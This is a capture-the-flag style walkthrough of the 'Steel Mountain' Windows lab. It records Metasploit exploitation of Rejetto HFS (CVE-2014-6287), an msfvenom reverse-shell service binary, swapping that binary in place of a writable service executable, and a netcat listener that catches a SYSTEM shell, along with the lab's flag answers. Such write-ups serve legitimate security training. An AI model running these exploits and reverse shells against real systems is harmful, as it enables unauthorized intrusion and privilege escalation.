### steel_mountain

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.


Deploy the machine.

Who is the employee of the month?
- bill harper

![[Pasted image 20220816075400.png]]
![[Pasted image 20220816075342.png]]

Take a look at the other web server. What file server is running?
- rejetto http file server

- upon checking, port 8080 has httpfile server that can be used to exploit via metasploit

```
8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3

```

- upon searching, we can use exploit/windows/http/rejetto_hfs_exec as entry for exploit

```
msf6 > search exploit/windows/http/rejetto_hfs_exec

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki
                                         /Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address o
                                         n the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.2.77.171      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.240.86
RHOSTS => 10.10.240.86
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > run

msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.2.77.171:4444 
[*] Using URL: http://10.2.77.171:8080/0Q1oDx
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /0Q1oDx
[*] Sending stage (175686 bytes) to 10.10.240.86
[*] Meterpreter session 1 opened (10.2.77.171:4444 -> 10.10.240.86:49220) at 2022-08-16 20:29:50 -0400
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\VSvqaMN.vbs' on the target

meterpreter >


```


What is the CVE number to exploit this file server?
- 2014-6287

Use Metasploit to get an initial shell. What is the user flag?
- located in user/bill/desktop

```
C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/27/2019  09:08 AM    <DIR>          .
09/27/2019  09:08 AM    <DIR>          ..
09/27/2019  05:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,155,801,600 bytes free

C:\Users\bill\Desktop>type user.txt
type user.txt
b04763b6fcf51fcd7c13abc7db4fd365

C:\Users\bill\Desktop>

```

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

Answer the questions below
To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

You can download the script here. Now you can use the upload command in Metasploit to upload the script.

![[Pasted image 20220817024756.png]]

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:

![[Pasted image 20220817024815.png]]

![[Pasted image 20220817024846.png]]

Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

- AdvancedSystemCareService9


The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.

msfvenom -p windows/shell_reverse_tcp LHOST=10.2.77.171 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe

Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.



```
meterpreter > upload ASCService.exe
[*] uploading  : /home/kali/ASCService.exe -> ASCService.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /home/kali/ASCService.exe -> ASCService.exe
[*] uploaded   : /home/kali/ASCService.exe -> ASCService.exe
meterpreter > load powershell_shell
Loading extension powershell_shell...
[-] Failed to load extension: No module of the name powershell_shell found
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell


PS > Set-Location "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
PS > Copy-Item ASCService.exe -Destination "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe" -Force
PS > Set-Location "C:\Program Files (x86)\IObit\Advanced SystemCare"


C:\Program Files (x86)\IObit\Advanced SystemCare>Stop-Service AdvancedSystemCareService9
Stop-Service AdvancedSystemCareService9
'Stop-Service' is not recognized as an internal or external command,
operable program or batch file.

C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9
[SC] ControlService FAILED 1062:

The service has not been started.


C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2876
        FLAGS              : 

C:\Program Files (x86)\IObit\Advanced SystemCare>

```

On Kali box:

```

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 6666        
listening on [any] 6666 ...
connect to [10.2.77.171] from (UNKNOWN) [10.10.181.115] 49228
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```


What is the root flag?
- 9af5f314f57607c00fd09803a587db80

to get to root:

```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,156,686,336 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
C:\Users\Administrator\Desktop>

```

END